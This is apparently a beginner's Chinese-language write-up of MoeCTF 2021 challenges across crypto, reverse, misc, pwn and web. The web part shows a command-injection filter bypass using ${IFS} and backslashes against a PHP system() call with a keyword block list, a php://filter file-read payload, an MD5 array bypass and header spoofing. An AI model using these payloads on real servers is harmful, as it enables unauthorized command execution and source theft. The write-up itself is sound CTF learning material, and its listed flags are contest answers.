# MoeCTF NiceAsiv

> 初次接触打CTF,经验也不足，WP的话就很偏小白，望大佬们轻点打(毕竟大一佬暴打大二菜鸡

```
这次主要做了做  ***Misc*** 和  ***Web***  
```

我自己初次接触打CTF,经验也不足，WP的话就很偏小白，望大佬们轻点打(毕竟大一佬暴打大二菜鸡

(也可关注我的blog: **[NiceAsiv](https://blog.csdn.net/weixin_50925658?spm=1001.2101.3001.5343)(交流)**

# **目录**

## **Crypto（3/14）**

1. Cryptography入门指北（略）
2. beginOfCrypto
4. LazyRSA

## **Reverse（4/14）**

1. 逆向工程入门指北（略）
2. welcome_to_the_world_of_re

3.Realezpy

7.大佬请喝coffee

## **Classical Cryptography（3/6）**

1. Augustine's Way

2.Augustine's Way#2

3.Ez Vigenere

## **MISC(10/12)**

1. [Misc](https://www.notion.so/76e55c7e8f5b4c4c912b45ffe0f55901)入门指北（略）
2. find_me
3. Macross
4. Homework
5. flipflipflip
6. White Album
7. Phone Call
8. 社工题
9. 好 康 的
10. easyForensics(比赛结束noah指导)
11. R P G(比赛结束noah指导)
12. 诺亚的日记

## **Pwn（3/11）**

1. Pwn入门指北（略）
2. test_your_nc
3. Int_overflow

## Web(9/14)

1. Web入门指北（略）
2. Web安全入门指北—GET
3. Web安全入门指北—小饼干
4. 2048
5. Web_Inc
6. ezinclude
7. babeRCE
8. Do you know HTTP?

**Crypto
02 beginOfCrypto**
直接打开发现有对应关系，那就把字母表输出再对照着人工将output的内容还原(~~不容易哈，人工智能)~~

- Flag

    moectf{c0me_on!begin_your_Crypt0_c4r33r}

**Reverse
02 welcome_to_the_world_of_re**
直接拖进 `101editor` 就能解

**03 Realezpy**

~~python逆向很难的啦，就找在线的啦~~

本来uncompyle6是可以轻松搞定的，结果一直出问题，索性在线反编译了

```php
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) 
# [GCC 7.5.0]
# Warning: this version of Python has problems handling the Python 3 "byte" type in constants properly.
import time
c = [119, 121, 111, 109, 100, 112, 123, 74, 105, 100, 114, 48, 120, 95, 49, 99, 95, 99, 121, 48, 121, 48, 121, 48, 121, 48, 95, 111, 107, 99, 105, 125]

def encrypt(a):
    result = []
    for i in range(len(a)):
        if ord('a') <= ord(a[i]) <= ord('z'):
            result.append((ord(a[i]) + 114 - ord('a')) % 26 + ord('a'))
        elif ord('A') <= ord(a[i]) <= ord('Z'):
            result.append((ord(a[i]) + 514 - ord('A')) % 26 + ord('A'))
        else:
            result.append(ord(a[i]))
    else:
        return result

ipt = input('Plz give me your flag:')
out = encrypt(ipt)
if len(ipt) != len(c):
    print('Wrong lenth~')
    exit()
else:
    for i in range(len(c))://32
        if out[i] != c[i]:
            print('Plz try again?')
            exit()
        else:
            print('Congratulations!!!')
            time.sleep(1)
            print('enjoy the beauty of python ~~~ ')
            import this
```

然后就是解码整出来flag

- Flag

    ~~flag我忘了，少年你来给我说吧~~

**07 大佬请喝coffee**

直接不管三七二十一逆向

```php
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class coffee {

   public static void main(String[] var0) {
      System.out.println("<---  moectf2021  --->");
      System.out.println(" [coffee] Welcome to moectf2021.");
      System.out.println("It will be quite ez for you. I guess.");
      System.out.print("Input your flag : ");
      String var1 = null;

      try {
         var1 = (new BufferedReader(new InputStreamReader(System.in))).readLine();
      } catch (Exception var3) {
         System.out.println("ERROR: Undefined Exception.");
      }

      if(var1.length() != 9) {
         System.out.println("QwQ. You are wrong.");
      } else {
         char[] var2 = var1.toCharArray();
         if(var2[0] * 4778 + var2[1] * 3659 + var2[2] * 9011 + var2[3] * 5734 + var2[4] * 4076 + var2[5] * 6812 + var2[6] * 8341 + var2[7] * 6765 + var2[8] * 7435 == 5711942 && var2[0] * 4449 + var2[1] * 5454 + var2[2] * 4459 + var2[3] * 5800 + var2[4] * 6685 + var2[5] * 6120 + var2[6] * 7357 + var2[7] * 3561 + var2[8] * 5199 == 4885863 && var2[0] * 3188 + var2[1] * 6278 + var2[2] * 9411 + var2[3] * 5760 + var2[4] * 9909 + var2[5] * 7618 + var2[6] * 7184 + var2[7] * 4791 + var2[8] * 8686 == 6387690 && var2[0] * 8827 + var2[1] * 7419 + var2[2] * 7033 + var2[3] * 9306 + var2[4] * 7300 + var2[5] * 5774 + var2[6] * 6588 + var2[7] * 5541 + var2[8] * 4628 == 6077067 && var2[0] * 5707 + var2[1] * 5793 + var2[2] * 4589 + var2[3] * 6679 + var2[4] * 3972 + var2[5] * 5876 + var2[6] * 6668 + var2[7] * 5951 + var2[8] * 9569 == 5492294 && var2[0] * 9685 + var2[1] * 7370 + var2[2] * 4648 + var2[3] * 7230 + var2[4] * 9614 + var2[5] * 9979 + var2[6] * 8309 + var2[7] * 9631 + var2[8] * 9272 == 7562511 && var2[0] * 6955 + var2[1] * 8567 + var2[2] * 7949 + var2[3] * 8699 + var2[4] * 3284 + var2[5] * 6647 + var2[6] * 3175 + var2[7] * 8506 + var2[8] * 6552 == 5970432 && var2[0] * 4323 + var2[1] * 4706 + var2[2] * 8081 + var2[3] * 7900 + var2[4] * 4862 + var2[5] * 9544 + var2[6] * 5211 + var2[7] * 7443 + var2[8] * 5676 == 5834523 && var2[0] * 3022 + var2[1] * 8999 + var2[2] * 5058 + var2[3] * 4529 + var2[4] * 3940 + var2[5] * 4279 + var2[6] * 4606 + var2[7] * 3428 + var2[8] * 8889 == 4681110) {
            System.out.println("Congratulations.");
            System.out.println("Here is your flag : moectf{" + var1 + "}");
         } else {
            System.out.println("You still need learn more!");
            System.out.println("Fighting!!!");
         }
      }    

   }
}
```

然后看到有多个线性方程组，直接提取放进matlab里面解，然后转化为ASCII

**Classical Cryptography**

**01 Classical Cryptography**
看着像凯撒密码，然后都是后移了一位，所以爆破了

**02 Augustine's Way#2**

除了字母还把一些字符也纳入进来，但同样直接爆破

**04 Ez Vigenere**

维尼吉亚密码，大胆猜测密钥是moectf,然后去在线网站里面解密

**Misc
02 find_me**
把文件拖进***010editor*** 进行查看，Flag跃然于右边的文本(之前都用的winhex,没想到***010edito***r又经济又实惠，hs yyds)

- Flag

    moectf{hs_g1v3_u_fl@g}

**03 Macross**
打开是一个以**mrf**为后缀名的文件，用百度搜了很久一直说是和mac系统相关连的文件格式，然后下了*Fileview*查看，看了个寂寞，~~只有我浪费了精力和希望，百度得了流量~~ 然后上 Google 搜到是记录鼠标行为的数据文件(*An MRF file is a data file created by Bartels Media Mouse Recorder*)，并找到下载相应的软件`MacrossRecorder`，然后打开 Windows 画图，运行文件并记录轨迹

![Untitled](MoeCTF%20NiceAsiv%20fc388a30ccb14bba99988b6f56321c23/Untitled.png)

- Flag

    moectf{Rec0rder_15_Funny}

**04 Homework**
大致按照word隐写的流程走一下，将字体全调成红色，发现有一处有重叠的字符，直接复制然后找一个文本框得出`flag{0h_U_`，调整阅读视图或者在kali中打开发现了`f1nd_m3!}`的文本(或者清除格式也能看到),最终得到Flag

- Flag

    moectf{0h_U_f1nd_m3!}

**05 flipflipflip**

~~这个题是真的恶心心~~(原谅我Noah大神)
104MB的字符串，用记事本打开(差点崩了),拉到最后看到标志性的***`==`***base64抬走伺候

然后就一路碰壁，软件解的答案不对，一千个软件有一千个结果  ，去网站解结果(网站直接玩崩溃)

最终在其中CyberChef网站能解，耗时(感谢BB的无私提供)

最终投向python脚本的怀抱，(这里感谢humor的帮助)

```python
import base64
f= open("task3.txt",'r')
flag=f.readline()
for i in range(100):
    try:
        flag=base64.b64decode(flag)
    except Exception as e:
        flag=flag[::-1]
        flag=base64.b64decode(flag)
    try: ##后面添加的代码
        flag = flag.decode('ascii')
    except Exception as e:
        flag = base64.b64encode(flag)[::-1]
        flag = flag.decode('ascii')

print(flag[::-1])
```

因为用python解出来第一遍解出来是倒着的，顺序改了一下之后，再解发现又倒了所以在humor的指导下写了以上脚本，结果在解了10多遍就开始出错(后面问了诺亚，原因是有一些需要反转的被直接decode,导致后面出错，所以添加了后面代码终于好了)                                                                                       

其实我觉得cyberChef也可以解出来慢一点而已，特别注意出错就要自己调一下

- Flag

    moectf{fffffflipppppp}

**06 White Album**
参考博客：

> [https://www.notion.so/MoeCTF-readme-txt-487c4f5e93764867b7aeead6a263c4ba#b8c0d9633d0e4bfe89ccd0fdb0f2672f]()

打开可以看到`.png` ，用kali打开图片，打不开（白屏），网上搜了一下，是图片宽高的问题，CRC爆破出原宽高(找到的脚本)

```python
import zlib
import struct

filename = 'test.png'
with open(filename, 'rb') as f:
    all_b = f.read()
    crc32key = int(all_b[29:33].hex(),16)
    data = bytearray(all_b[12:29])
    n = 4095            #理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了
    for w in range(n):          #高和宽一起爆破
        width = bytearray(struct.pack('>i', w))     #q为8字节，i为4字节，h为2字节
        for h in range(n):
            height = bytearray(struct.pack('>i', h))
            for x in range(4):
                data[x+4] = width[x]
                data[x+8] = height[x]
            crc32result = zlib.crc32(data)
            if crc32result == crc32key:
                print("宽为：",end="")
                print(width)
                print("高为：",end="")
                print(height)
                exit(0)
```

然后在`010 Editor` 里改它的宽高部分，得到完整图片，出现条码拿到在线二维码网站解码(后面得知是`PDF417`  介于二维码和条形码的一种码)

> 推荐网站： [https://jiema.wwei.cn](https://jiema.wwei.cn/)

- Flag

    moectf{WhY_@r3_u_s0_5K1ll3D}

**07 Phone Call**
参考博客[https://www.zhihu.com/question/19780683](https://www.zhihu.com/question/19780683)
这种题一就很复杂，拿到`audacity`看到将近21个峰(~~你家电话有那么长~~)

然后偶然发现一个网站，就起飞，嘿嘿嘿(*咱没有手撕能力*)

> [http://dialabc.com/sound/detect/index.html](http://dialabc.com/sound/detect/index.html)

再根据`audacity`给的间隔设置间隔符号就sucess了

- Flag

    moectf{114514-1919810-7738-9634}

**08 社工题**
第一次接触社工题，网上搜了很多案例，然后想到上一届moectf wp留下了博客（嘿嘿其实直接bing noah 博客也可以找到）

找到[NoahBox (noahtie.github.io)](https://noahtie.github.io/) 只获得了[h](https://noahbox.github.io/)[ttps://masternoah.lofter.com/](https://masternoah.lofter.com/)   lofter博客
当时在lofter博客中找到[noahbox.github.io](http://noahbox.github.io/)，（当时没注意后面复写一遍才发现不同）在里面留言板里找到了 HackerHS，最后找到第二个仓库根据意思在里面找到commits，发现莫尔斯电码，解码（网上有一些在线解的有问题，多找几个试试）下面是我找的一个`摩尔斯电码工具`

> 链接：[https://pan.baidu.com/s/1KQlJp5OlWlBDClOiMx-jtA](https://pan.baidu.com/s/1KQlJp5OlWlBDClOiMx-jtA)
提取码：qs31

- Flag

    moectf{HAHAHAHAH_NOAH_IS_A_VEGETABLE_CHICKEN}

**09 好 康 的**

> 参考博客[https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%7B%22request%5Fid%22%3A%22163249925516780262529870%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163249925516780262529870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&utm_term=mkv&spm=1018.2226.300](https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163249925516780262529870%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163249925516780262529870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&utm_term=mkv&spm=1018.2226.3001.4450)

播放发现在3分钟左右之后就不能播放，感觉有问题，用 `mkvtoolnix` 分离出来字幕和视频，拖进`010 Editor` 直接搜索 `moectf` ，找到flag

- Flag

    moectf{N3v3r_90tt@_L3t-y0U_dOwN~}

**10 easyForensics(比赛时没做出来)**
用 `AccessData FTK Imager` 打开，游览找到 `flag.mp4` ，非常惊喜，用各种办法尝试分析没得出任何信息(虽然发现有一些很奇怪的文件)

等到比赛结束的时候才知道不是这个文件(~~Noah设陷阱哈~~，比赛结束后在 `FTK` 里发现一些被删除的文件夹(Base64命名)还有一个python文件，全部导出来，然后用bat导出文件名

```python
DIR *. * /B> LIST.TXT
```

看到python文件中有 `data = data.replace("/", "_")` 我们再将`_`全部换成`/`

再用base64解码(我用`CyberChef`)查看16进制结果，发现是个word,网上找脚本输出word得出flag

- Flag

    moectf{Th@1s_N0t_U53FULL@_4LL}

**11 R P G**
~~这个我以为要修改数据通关数据，确实也是如此因为实在过不了关~~

Noah师傅传授的一种就是交换`Data`  里的`Map001.json` `和Map002.json` 的文件名称，便可通过第一关拿到第一个字母，*~~往复循环~~*你就可以得到base64编码的一串字符串（~~秃了也变强了~~）

其实打开map002.json，仔细查看便可以看到一列有规律的base64字符串，提取出来，反复解码，便得到Flag

- Flag

    moectf{Th3_w0rld_0f_G4m3}

**12 诺亚的日记**

> 参考博客[https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%7B%22request%5Fid%22%3A%22163250153316780269830444%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=163250153316780269830444&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&utm_term=tshark+usb&spm=1018.2226.3001.4187](https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163250153316780269830444%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163250153316780269830444&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&utm_term=tshark+usb&spm=1018.2226.3001.4187)

用`101editor`打开，发现了`wireshark`字样，正好之前用过，结果数据里面没有`Leftover Capture Data` ，就百度到上面的博客，在kali中执行以下命令，结果空白格,~~大胆猜测不是我的问题是kali的问题 ，~~放到ubuntu里面分析，可以了(实际*kali的tshark的版本问题*)

```bash
tshark -r usb.pcap -T fields -e usb.capdata > usbdata.txt
tshark -r usb.pcap -T fields -e usb.capdata | sed '/^\s*$/d' > usbdata.txt #提取并去除空行
```

便提取到了usb的流量数据，然后用映射关系，将所做操作提取出来

```bash
normalKeys = {
    "04":"a", "05":"b", "06":"c", "07":"d", "08":"e",
    "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j",
     "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o",
      "13":"p", "14":"q", "15":"r", "16":"s", "17":"t",
       "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y",
        "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4",
         "22":"5", "23":"6","24":"7","25":"8","26":"9",
         "27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t",
         "2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\",
         "32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".",
         "38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>",
         "3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>",
         "44":"<F11>","45":"<F12>"}
shiftKeys = {
    "04":"A", "05":"B", "06":"C", "07":"D", "08":"E",
     "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J",
      "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O",
       "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T",
        "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y",
         "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$",
          "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")",
          "28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>",
          "2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"",
          "34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>",
          "3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>",
          "41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('usbdata.txt')
for line in keys:
    try:
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
             continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    except:
        pass

keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        del output[a-1]
    except:
        pass

for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    except:
        pass

print ('output :' + "".join(output))
##结果2021nian<SPACE>8yue<SPACE>5ri<SPACE>,qing22<DEL><RET>zuotian<SPACE>gei<SPACE>hanshu<SPACE>fale<SPACE>caotu<SPACE>,cadai<DEL><DEL><DEL><DEL><DEL>odaooo<DEL><DEL>41tale<SPACE>,kaixin<SPACE><RET>yizhou<SPACE>meiyoukan<SPACE>jiaran=61de<SPACE>shipinle<SPACE>,nanshou<SPACE>nie1<RET>dongfangyaohe<SPACE>musedash<RET>liandongle<SPACE>,shuangchukuangxi<SPACE>[unknown][unknown]<DEL>chu=2[unknown][unknown]<RET>moectf<RET>de<SPACE>misc<RET>ti<SPACE>caichule<SPACE>4dao2,male<SPACE><RET>woxiang<SPACE>moyu2moyu<SPACE>mou<DEL>yu<SPACE><RET>d<DEL><GA>damedane	<RET>\<DEL>,<RET>dameyo<SPACE><RET>,<RET>damenanoyo<SPACE><RET><RET>xin2misc<RET>ti<SPACE>de<SPACE>flag<RET>xiangge3shengcao21yidiande<SPACE><RET>jiujiao<DEL><DEL><DEL><DEL>yo<DEL>ng<SPACE><SPACE>*moectf<RET>{}[unknown]D@m3daNe_D4me_yoooooo*[unknown][unknown][unknown]haole<DEL><DEL><DEL><DEL><DEL><SPACE>haole<SPACE>riji<SPACE>.<DEL>.txt<RET>
```

- Flag

    moectf{D@m3daNe_D4me_yoooooo}

## **PWN**

**02 test_your_nc**

> `nc pwn.blackbird.wang 9500`

nc，想起来做web渗透时用过(*nc命令，是一个简单可靠地网络工具*)

所以按照题目说的(然后***ls***,看到有flag，直接用***cat***查看)
得到flag

- Flag

    moectf{enjoy_the_netcat_and_the_shell}

**03 Int_overflow**

> pwn.blackbird.wang 9501

```bash
nc pwn.blackbird.wang 9501
Do you no integer overflow?
Input an int ( <0 )
-1
But I want <0 now!
-1
You know int overflow!
ls
bin
dev
flag
intoverflow
lib
lib32
lib64
cat flag
moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}
```

- Flag

    moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}

## **Web**

0**2 Web安全入门指北—GET**
用GET获取
`http://47.93.215.154:10000/?moe=flag`

**03 Web安全入门指北—POST**
`Hackerbar` 发个POST
****

**04 Web安全入门指北—小饼干**
`Firefox`F12 把重发送GET,将`heade`r中的cookies里值改成1，发送

得到响应

- Flag

    moectf{C00kie_1s_sw33t!}

### **05 2048**

任意玩了几下，回显50000分才给你flag(~~果断不上当~~)
查看源代码发现这个

```php
getFlag: function() {
var req = new XMLHttpRequest;
req.open("GET","flag.php?score="+obj.score,true);
req.onload = function() {
alert(this.responseText);
}
req.send();
}
}
```

发送GET

`http://47.93.215.154:5001/flag.php?score=5000000000000`
获得flag

- Flag

    moectf{2048_1s_intere5t1ng!}

### 06 Web_Inc

> [https://blog.csdn.net/CSDNiamcoming/article/details/108837347](https://blog.csdn.net/CSDNiamcoming/article/details/108837347)

```php
?php
error_reporting(0);
include_once "flag.php";
$a=$_GET['a'];
$b=$_POST['b'];
if(isset($a)){
    if($a!=$b&&md5($a)===md5($b)){//
        echo $flag;
    }else{
        echo 'try again';
    }
}else{
    highlight_file(__FILE__);
}
```

尝试用了数组绕过

[`http://47.98.215.112:78/?a[]=1`](http://47.98.215.112:78/?a%5B%5D=1)

`再用Hackbar 传post: b[]=2` 直接接住flag

- Flag

    moectf{xdsec3gf9dfg62fh342}

### **07 ezinclude**

> 参考博客[https://blog.csdn.net/vhkjhwbs/article/details/99728785](https://blog.csdn.net/vhkjhwbs/article/details/99728785)

全程照抄网上的

[`http://47.98.215.112:5000/?file=php://filter/read=convert.base64-encode/resource=flag.php`](http://47.98.215.112:5000/?file=php://filter/read=convert.base64-encode/resource=flag.php)
得到base64字符串，解码Flag

- Flag

    moectf{xdsec6asdgas7ahfsfaxczc}

### **08 babeRCE**

> 参考博客[https://www.cnblogs.com/0yst3r-2046/p/12600073.html](https://www.cnblogs.com/0yst3r-2046/p/12600073.html)

```php
<?php
$rce = $_GET['rce'];
if (isset($rce)) {
if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
system($rce);
}else {
echo "hhhhhhacker!!!"."\n";
}
} else {
highlight_file(**FILE**);
}
```

审查代码看到*cat more less nl tac等* 都被过滤了，ls没被过滤，用`burpsuite` 进行监控，重发

[`http://47.93.215.154:5000/](http://47.93.215.154:5000/)?rce=ls`  发现了flag.php以及index.php，~~绝笔藏在flag，但不能直接看，那就绕过~~

`rce=ca\t${IFS}fla\g.php` ,得到flag

![Untitled](MoeCTF%20NiceAsiv%20fc388a30ccb14bba99988b6f56321c23/Untitled%201.png)

- Flag

    moectf{Do_y0u_l1k3_Rcccccccccccccce?}

### 09 Do you know HTTP?

用BP将GET抓包下来，修改

```php
HS / HTTP/1.1
Host: 47.93.215.154:5002
User-Agent: LT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
X-Forwarded-For: 127.0.0.1
Referer: www.ltyyds.com
```

得到Flag

- flag

    moectf{HTTPHeaders_1s_s0_ea5y!}